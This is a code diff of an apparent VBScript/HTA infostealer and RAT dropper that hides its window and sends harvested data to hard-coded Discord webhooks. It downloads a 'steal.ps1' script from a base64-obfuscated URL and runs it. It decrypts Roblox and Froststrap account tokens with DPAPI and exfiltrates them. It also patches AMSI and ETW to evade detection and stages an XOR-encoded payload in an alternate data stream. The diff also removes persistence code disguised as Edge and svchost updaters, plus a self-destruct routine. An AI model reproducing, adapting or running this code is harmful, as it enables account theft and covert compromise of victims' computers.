@@ -5,15 +5,13 @@
 window.resizeTo 0,0:window.moveTo -2000,-2000
 On Error Resume Next
 
-Dim sh, fso, WH, RE_WH, CMD_WH, PC, USER
+Dim sh, fso, WH, RE_WH, PC, USER
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-' --- WEBHOOKS ---
+' --- WEBHOOKS: WH = logs, RE_WH = re-grab ---
 WH = "https://discord.com/api/webhooks/1572026403560357978/n4qVnwrF6-OKw6vRfm73KZNXc-8X3IVSkOgQcfRb35d92LOEujl6OMvBy3GpPWrsXdQN"
 RE_WH = "https://discord.com/api/webhooks/1572026526407467079/KUyJrlGn-BaxdIM4Py18HaoCznPd3rfi411OUUewgpFL9Sfx7JGM7qYRtNtXU3vkHh5r"
-' *** PASTE YOUR CMD-CONTROL WEBHOOK BELOW ***
-CMD_WH = "https://discord.com/api/webhooks/PASTE_CMD_WEBHOOK_HERE"
 
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
@@ -40,179 +38,41 @@ For attempt = 1 To 10
     If attempt < 10 Then Call SleepSeconds(10)
 Next
 
-' --- Plant hidden copies ---
-Call PlantCopies
-
-' --- Re-grab chain (re-grab -> RE_WH, with rat re-drop + cmd poll) ---
+' --- Re-grab chain (re-grab -> RE_WH) ---
 Dim runCount
-runCount = 0
-Do
-    runCount = runCount + 1
-
-    ' CMD channel poll — self-destruct check
-    Dim killed : killed = PollCmd(CMD_WH)
-    If killed Then
-        Call PostEmbedTo(":skull: Self-destruct", USER & " @ " & PC & " — wiping", 16711680, CMD_WH)
-        Call SelfDestruct
-        Exit Do
-    End If
-
-    Call PostEmbedTo(":repeat: Re-grab " & runCount, "PC: " & PC & " | User: " & USER, 3447003, RE_WH)
-
-    ' Re-download and re-plant the rat every cycle
-    Call PostEmbedTo(":rocket: Re-drop RAT", "Fetching + re-planting", 3447003, RE_WH)
-    Call DropRAT(RE_WH)
-    Call PlantCopies
-
+For runCount = 1 To 4
+    Call PostEmbedTo(":repeat: Re-grab " & runCount & "/4", "PC: " & PC & " | User: " & USER, 3447003, RE_WH)
     Call GrabTokens(RE_WH)
     Call IP(RE_WH)
     Call GrabRoblox(RE_WH)
     Call GrabFroststrap(RE_WH)
-
-    Call SleepSeconds(150)
-Loop
+    If runCount < 4 Then Call SleepMinutes(5)
+Next
 
 window.close()
 
-' --- CMD poll: query recent messages in cmd channel, look for !kill <user> ---
-Function PollCmd(cmdwh)
-    PollCmd = False
-    Dim api, xh, resp
-    ' strip trailing slash, get channel id
-    On Error Resume Next
-    Dim parts : parts = Split(cmdwh, "/")
-    Dim whId : whId = parts(UBound(parts) - 1)
-    Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    xh.SetOption 2, 13056
-    xh.Open "GET", "https://discord.com/api/v10/webhooks/" & whId & "/messages?limit=5", False
-    xh.SetRequestHeader "Authorization", "Bot "
-    xh.Send
-    If xh.Status = 200 Then resp = xh.responseText
-    Set xh = Nothing
-    On Error Goto 0
-    If Len(resp) = 0 Then Exit Function
-
-    ' crude parse: look for !kill <USERNAME>
-    Dim target : target = "!kill " & USER
-    If InStr(1, resp, target, vbTextCompare) > 0 Then
-        PollCmd = True
-    End If
-End Function
-
-' --- Self-destruct: wipe every planted copy + persistence + live processes ---
-Sub SelfDestruct()
-    On Error Resume Next
-    Dim tPath : tPath = sh.ExpandEnvironmentStrings("%TEMP%")
-    Dim apPath : apPath = sh.ExpandEnvironmentStrings("%APPDATA%")
-    Dim loPath : loPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%")
-    Dim pdPath : pdPath = sh.ExpandEnvironmentStrings("%PROGRAMDATA%")
-    Dim upPath : upPath = sh.ExpandEnvironmentStrings("%USERPROFILE%")
-
-    ' kill running
-    sh.Run "cmd /c taskkill /f /im agent.exe > nul 2>&1", 0, True
-    sh.Run "cmd /c taskkill /f /im msedgeupdater.exe > nul 2>&1", 0, True
-    sh.Run "cmd /c taskkill /f /im svchostupd.exe > nul 2>&1", 0, True
-    sh.Run "cmd /c taskkill /f /im sysmonx.exe > nul 2>&1", 0, True
-
-    ' kill any scheduled task we might have made
-    sh.Run "cmd /c schtasks /delete /tn MicrosoftEdgeUpdate* /f > nul 2>&1", 0, True
-
-    ' delete planted locations
-    Dim paths(20)
-    paths(0) = tPath & "\agent.exe"
-    paths(1) = tPath & "\cache.dat"
-    paths(2) = tPath & "\msedgeupdater.exe"
-    paths(3) = apPath & "\Microsoft\Windows\Themes\msedgeupdater.exe"
-    paths(4) = apPath & "\Roaming\svchostupd.exe"
-    paths(5) = loPath & "\Microsoft\Edge\User Data\Default\Cache\sysmonx.exe"
-    paths(6) = loPath & "\Temp\agent.exe"
-    paths(7) = pdPath & "\Microsoft\Windows\Caches\msedgeupdater.exe"
-    paths(8) = pdPath & "\svchostupd.exe"
-    paths(9) = upPath & "\Documents\msedgeupdater.exe"
-    paths(10) = upPath & "\Downloads\agent.exe"
-    paths(11) = apPath & "\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
-    paths(12) = apPath & "\Microsoft\Windows\Start Menu\Programs\Startup\svchostupd.vbs"
-    paths(13) = apPath & "\Microsoft\Windows\Start Menu\Programs\Startup\sysmonx.vbs"
-    Dim k
-    For k = 0 To 13
-        If fso.FileExists(paths(k)) Then
-            On Error Resume Next
-            fso.DeleteFile paths(k), True
-            On Error Goto 0
-        End If
-    Next
-
-    ' remove registry persistence
-    sh.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate"
-    sh.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemUpdate"
-    sh.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\EdgeUpdate"
-    sh.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate"
-
-    ' remove trace
-    If fso.FileExists(tf) Then fso.DeleteFile tf, True
-
-    ' delete self (HTA path)
-    Dim selfPath : selfPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\~vanta_selfdel.bat"
-    WriteFile selfPath, "@echo off" & vbCrLf & _
-        "timeout /t 2 /nobreak >nul" & vbCrLf & _
-        "del /f /q """ & sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\Desktop\*.hta"" >nul 2>&1" & vbCrLf & _
-        "del /f /q """ & sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\Downloads\*.hta"" >nul 2>&1" & vbCrLf & _
-        "del ""%~f0"" >nul 2>&1"
-    sh.Run "cmd /c start /min """" """ & selfPath & """", 0, False
-
-    ' kill own process
-    sh.Run "cmd /c taskkill /f /im mshta.exe > nul 2>&1", 0, True
+' --- AMSI PATCH ---
+Sub PatchAMSI()
+    Dim ps
+    ps = "$a=[Ref].Assembly.GetTypes()|?{$_.Name -like '*iUtils'};" & _
+         "$b=$a.GetFields('NonPublic,Static')|?{$_.Name -like '*Context'};" & _
+         "[Runtime.InteropServices.Marshal]::WriteInt32($b.GetValue($null),0x41414141)"
+    Dim psf : psf = TmpFile("a.ps1")
+    WriteFile psf, ps
+    sh.Run "powershell -NoP -Exec Bypass -WindowStyle Hidden -File """ & psf & """", 0, True
+    fso.DeleteFile psf, True
 End Sub
 
-' --- PlantCopies: scatter the payload to multiple hidden locations ---
-Sub PlantCopies()
-    On Error Resume Next
-    Dim src : src = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & Chr(97) & Chr(103) & Chr(101) & Chr(110) & Chr(116) & Chr(46) & Chr(101) & Chr(120) & Chr(101)
-    If Not fso.FileExists(src) Then Exit Sub
-    If fso.GetFile(src).Size < 3000000 Then Exit Sub
-
-    Dim apPath : apPath = sh.ExpandEnvironmentStrings("%APPDATA%")
-    Dim loPath : loPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%")
-    Dim pdPath : pdPath = sh.ExpandEnvironmentStrings("%PROGRAMDATA%")
-    Dim upPath : upPath = sh.ExpandEnvironmentStrings("%USERPROFILE%")
-
-    Dim dst(6)
-    dst(0) = apPath & "\Microsoft\Windows\Themes\msedgeupdater.exe"
-    dst(1) = apPath & "\Roaming\svchostupd.exe"
-    dst(2) = loPath & "\Microsoft\Edge\User Data\Default\Cache\sysmonx.exe"
-    dst(3) = pdPath & "\Microsoft\Windows\Caches\msedgeupdater.exe"
-    dst(4) = pdPath & "\svchostupd.exe"
-    dst(5) = upPath & "\Documents\msedgeupdater.exe"
-    dst(6) = upPath & "\Downloads\agent.exe"
-
-    Dim i
-    For i = 0 To 6
-        On Error Resume Next
-        Dim parent : parent = fso.GetParentFolderName(dst(i))
-        If Not fso.FolderExists(parent) Then fso.CreateFolder parent
-        fso.CopyFile src, dst(i), True
-        ' set hidden+system
-        sh.Run "cmd /c attrib +h +s """ & dst(i) & """", 0, True
-        On Error Goto 0
-    Next
-
-    ' Persistence on 3 planted copies via RunOnce + Startup VBS
-    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemUpdate", """" & dst(0) & """", "REG_SZ"
-    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\EdgeUpdate", """" & dst(2) & """", "REG_SZ"
-
-    ' Startup VBS droppers
-    Call MakeStartupVbs("svchostupd.vbs", dst(1))
-    Call MakeStartupVbs("sysmonx.vbs", dst(5))
-
-    Call PostEmbedTo(":seedling: Planted", "7 copies + 2 run keys + 2 startup vbs", 3447003, RE_WH)
-End Sub
-
-Sub MakeStartupVbs(fname, target)
-    On Error Resume Next
-    Dim sp : sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\" & fname
-    Dim sf : Set sf = fso.CreateTextFile(sp, True)
-    sf.WriteLine "CreateObject(""WScript.Shell"").Run """ & target & """, 0, False"
-    sf.Close
+' --- ETW PATCH ---
+Sub PatchETW()
+    Dim ps
+    ps = "$p=[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider');" & _
+         "$f=$p.GetField('etwProvider','NonPublic,Static');" & _
+         "if($f){$f.SetValue($null,$null)}"
+    Dim psf : psf = TmpFile("e.ps1")
+    WriteFile psf, ps
+    sh.Run "powershell -NoP -Exec Bypass -WindowStyle Hidden -File """ & psf & """", 0, True
+    fso.DeleteFile psf, True
 End Sub
 
 ' --- DropRAT: ADS stage + XOR + buffer + schtask parent swap ---
@@ -235,9 +95,11 @@ Sub DropRAT(targetWH)
         Exit Sub
     End If
 
+    ' XOR and stage to ADS
     Dim xored : xored = XorBytes(body)
     WriteBinary ads, xored
 
+    ' Read back, decode, write to .exe
     Dim readBack : readBack = ReadBinary(ads)
     Dim decoded : decoded = XorBytes(readBack)
     WriteBinary op, decoded
@@ -272,6 +134,7 @@ Function HttpGetBytes(url)
     Set xh = Nothing
 End Function
 
+' --- XorBytes: XOR with 0x5A ---
 Function XorBytes(data)
     Dim stmIn : Set stmIn = CreateObject("ADODB.Stream")
     stmIn.Type = 1
@@ -343,29 +206,6 @@ Function ReadBinary(path)
     stm.Close
     Set stm = Nothing
 End Function
-
-' --- AMSI/ETW patch ---
-Sub PatchAMSI()
-    Dim ps
-    ps = "$a=[Ref].Assembly.GetTypes()|?{$_.Name -like '*iUtils'};" & _
-         "$b=$a.GetFields('NonPublic,Static')|?{$_.Name -like '*Context'};" & _
-         "[Runtime.InteropServices.Marshal]::WriteInt32($b.GetValue($null),0x41414141)"
-    Dim psf : psf = TmpFile("a.ps1")
-    WriteFile psf, ps
-    sh.Run "powershell -NoP -Exec Bypass -WindowStyle Hidden -File """ & psf & """", 0, True
-    fso.DeleteFile psf, True
-End Sub
-
-Sub PatchETW()
-    Dim ps
-    ps = "$p=[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider');" & _
-         "$f=$p.GetField('etwProvider','NonPublic,Static');" & _
-         "if($f){$f.SetValue($null,$null)}"
-    Dim psf : psf = TmpFile("e.ps1")
-    WriteFile psf, ps
-    sh.Run "powershell -NoP -Exec Bypass -WindowStyle Hidden -File """ & psf & """", 0, True
-    fso.DeleteFile psf, True
-End Sub
 
 ' --- IP ---
 Sub IP(targetWH)
@@ -457,9 +297,12 @@ Sub GrabFroststrap(targetWH)
         If fdir <> "" Then fp = fdir & "\Cache\AccountManager.json"
     End If
     If Not fso.FileExists(fp) Then Exit Sub
-    Call PostEmbedTo(":snowflake: Froststrap", "Froststrap found", 3447003, targetWH)
+
+    Call PostEmbedTo(":snowflake: Froststrap", "Froststrap found, grabbing accounts...", 3447003, targetWH)
+
     Dim ps
-    ps = "$w='" & targetWH & "';Add-Type -AssemblyName System.Security;$p=Join-Path $env:LOCALAPPDATA 'Froststrap\Cache\AccountManager.json';if(!(Test-Path $p)){try{$r=Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\Froststrap' -ErrorAction Stop;$p=Join-Path $r.InstallLocation 'Cache\AccountManager.json'}catch{}};if(!(Test-Path $p)){exit};$j=Get-Content $p -Raw|ConvertFrom-Json;$e=[Text.Encoding]::UTF8.GetBytes('Froststrap_DPAPI_v1');$lines=@();foreach($a in $j.accounts){try{$eb=[Convert]::FromBase64String($a.SecurityToken);$db=[Security.Cryptography.ProtectedData]::Unprotect($eb,$e,[Security.Cryptography.DataProtectionScope]::CurrentUser);$c=[Text.Encoding]::UTF8.GetString($db)}catch{$c='FAILED'};$lines+='**'+$a.Username+'** : '+$c};$desc=($lines -join [char]10);$payload=@{embeds=@(@{title='Froststrap';description=$desc;color=3447003})}|ConvertTo-Json -Depth 4 -Compress;Invoke-RestMethod $w -Method Post -Body $payload -ContentType 'application/json'"
+    ps = "$w='" & targetWH & "';Add-Type -AssemblyName System.Security;$p=Join-Path $env:LOCALAPPDATA 'Froststrap\Cache\AccountManager.json';if(!(Test-Path $p)){try{$r=Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\Froststrap' -ErrorAction Stop;$p=Join-Path $r.InstallLocation 'Cache\AccountManager.json'}catch{}};if(!(Test-Path $p)){exit};$j=Get-Content $p -Raw|ConvertFrom-Json;$e=[Text.Encoding]::UTF8.GetBytes('Froststrap_DPAPI_v1');$lines=@();foreach($a in $j.accounts){try{$eb=[Convert]::FromBase64String($a.SecurityToken);$db=[Security.Cryptography.ProtectedData]::Unprotect($eb,$e,[Security.Cryptography.DataProtectionScope]::CurrentUser);$c=[Text.Encoding]::UTF8.GetString($db)}catch{$c='DECRYPT FAILED'};$lines+='**'+$a.Username+'** ['+$a.UserId+'] : '+$c};$desc=($lines -join [char]10);if($desc.Length -eq 0){$desc='No accounts found'};$payload=@{embeds=@(@{title=':snowflake: Froststrap Accounts';description=$desc;color=3447003})}|ConvertTo-Json -Depth 4 -Compress;Invoke-RestMethod $w -Method Post -Body $payload -ContentType 'application/json'"
+
     sh.Run "powershell -NoP -Exec Bypass -Command """ & ps & """", 0, True
 End Sub
 
@@ -468,6 +311,7 @@ Sub GrabTokens(targetWH)
     Dim b64Gist : b64Gist = "aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9pdmVzaGFoYWhhL2JiNWU1MTFhNjI3ZmYxY2U4MGNjYzQ4MzkxNTNmOTAxL3Jhdy9zdGVhbC5wczE="
     Dim gUrl : gUrl = DecodeB64(b64Gist)
     gUrl = Replace(gUrl, "psa1", "ps1")
+
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
     xh.Open "GET", gUrl, False
@@ -476,14 +320,19 @@ Sub GrabTokens(targetWH)
     Dim pc: pc = xh.responseText
     If Len(pc) < 100 Then Exit Sub
     Set xh = Nothing
+
     Dim psf: psf = TmpFile("steal.ps1")
     WriteFile psf, pc
+
     Dim psExec : psExec = Chr(112)&Chr(111)&Chr(119)&Chr(101)&Chr(114)&Chr(115)&Chr(104)&Chr(101)&Chr(108)&Chr(108) & " -NoP -Exec Bypass -File """ & psf & """"
     sh.Run "cmd /c " & psExec, 0, True
+
     fso.DeleteFile psf, True
-    Dim tf2: tf2 = TmpFile("steal_result.txt")
-    If Not fso.FileExists(tf2) Then Exit Sub
-    Dim raw: raw = ReadFile(tf2)
+
+    Dim tf: tf = TmpFile("steal_result.txt")
+    If Not fso.FileExists(tf) Then Exit Sub
+    Dim raw: raw = ReadFile(tf)
+
     If Len(raw) > 10 Then
         Dim lines: lines = Split(raw, vbCrLf)
         Dim l
@@ -512,6 +361,7 @@ End Sub
 Sub SleepSeconds(s)
     sh.Run "cmd /c ping -n " & (s + 1) & " 127.0.0.1 > nul", 0, True
 End Sub
+
 Sub SleepMinutes(m)
     Call SleepSeconds(m * 60)
 End Sub
